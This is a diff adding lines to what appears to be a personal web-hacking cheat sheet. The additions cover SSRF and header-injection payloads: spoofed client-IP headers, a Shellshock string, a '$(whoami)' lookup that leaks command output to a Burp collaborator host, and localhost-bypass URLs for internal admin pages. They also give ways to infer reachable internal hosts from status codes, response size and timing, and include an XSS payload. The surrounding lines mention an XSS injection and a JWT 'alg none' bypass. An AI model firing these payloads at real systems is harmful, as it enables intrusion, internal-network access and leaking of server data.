@@ -198,6 +198,56 @@ or you can inject >> <scrip> data{"name"-alert(1)-"hossam"}</script> that is if 
    2- change user role and alg to "none" and remove signature and leave . after payload 
    3- 
 
+
+
+
+True-Client-IP:
+X-Wap-Profile:
+X-Client-IP:
+CF-Connecting_IP:
+X-Forwarded-For:
+Client-IP:
+X-Originating-IP:
+All headers with
+burp-collaborator
+Evil payloads over headers:
+X-Forwarded-For: id.burplink.net:8080/aditya.php
+X-Forwarded-For: http://user:pass@hostname/
+User-Agent:() { :; }; /usr/bin/nslookup
+$(whoami).id.burpcollaborator.net
+
+
+Response status code:
+Online internal asset:port responds with
+200 OK vs offline internal asset:port 500
+Internal Server Error
+Response contents:
+The response size in bytes is smaller or
+bigger depending on whether or not the
+URL you are trying to request is reachable.
+Response timing:
+The response times are slower or faster
+depending on whether or not the URL you
+are trying to request is reachable.
+
+
+example.com
+SHORT-HAND IP
+http://0/Admin/
+http://127.1/AdMiN
+http://127.0.1/aDMIn
+LOCALHOST WITH A
+DOMAIN REDIRECTION
+http://spoofed.burpcollaborator.net
+http://localtest.me
+127.0.0.1.nip.io
+STORY OF [::]
+http://[::]:22/ SSH
+
+["');alert('XSS');//"]@xyz.xxx	json pypass
+
+ 
+
 -------------------------------------------------------------------------------------------
                                     XXE
     
